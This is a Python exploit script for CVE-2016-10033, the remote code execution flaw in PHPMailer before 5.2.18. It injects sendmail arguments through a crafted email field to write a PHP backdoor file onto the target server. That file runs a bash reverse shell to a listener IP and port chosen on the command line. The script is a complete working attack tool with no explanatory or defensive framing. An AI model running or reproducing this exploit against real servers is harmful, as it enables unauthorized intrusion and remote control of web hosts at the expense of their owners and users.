import argparse
import requests
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2016-10033
# PHPMailer < 5.2.18 RCE
class CVE2016_10033:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, backdoor, host, port):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url, self.backdoor = url.rstrip("/"), backdoor
        self.host, self.port = host, port
        self.session = requests.Session()
        self.session.headers.update(self.headers)

    def exploit(self):
        print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
        payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\"); ?>".format(self.host, self.port)
        email = "\"cocomelonc@127.0.0.1\" -oQ/tmp/ -X" + self.backdoor + " root\"@hack.com"
        data = {"email" : email, "text" : payload, "subject" : "hack :)"}
        try:
            r = self.session.get(self.url, data, verify = False)
        except Exception as e:
            print (LogColors.RED + "failed send payload: " + str(e) + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
            else:
                print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-p','--path', required = True, help = "backdoor path")
    parser.add_argument('-I','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-P','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url, path = args['url'], args['path']
    ip, port = args['ip'], args['port']
    cve = CVE2016_10033(url, path, ip, port)
    cve.exploit()

